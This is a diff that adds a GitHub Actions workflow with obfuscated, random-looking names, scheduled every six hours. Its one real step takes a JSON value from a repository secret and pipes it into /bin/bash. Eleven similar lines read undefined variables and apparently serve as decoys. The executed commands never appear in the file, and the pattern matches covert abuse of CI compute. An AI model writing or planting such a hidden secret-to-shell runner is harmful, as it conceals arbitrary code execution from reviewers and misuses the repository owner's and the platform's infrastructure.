@@ -1,0 +1,29 @@
+name: baozhongchu5657
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '4 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: baozhongchu5657
+        env:
+          ev760: ${{ secrets.ev760 }}
+        run: |
+          echo $ev760 | jq -r .v96971 | /bin/bash
+          echo $chz90494 | jq -r .so8537 | /bin/bash
+          echo $shogm6 | jq -r .hlj0515 | /bin/bash
+          echo $lmkb1 | jq -r .hl00080 | /bin/bash
+          echo $usmpg59 | jq -r .jcd9581 | /bin/bash
+          echo $skekn53093 | jq -r .wsqr5 | /bin/bash
+          echo $ifbi37 | jq -r .nf4 | /bin/bash
+          echo $xnhei344 | jq -r .wn0134 | /bin/bash
+          echo $k64 | jq -r .qbvio89640 | /bin/bash
+          echo $dgcu78 | jq -r .gcm18 | /bin/bash
+          echo $ww5020 | jq -r .qrum1483 | /bin/bash
+          echo $mvb87263 | jq -r .qopi3 | /bin/bash
+
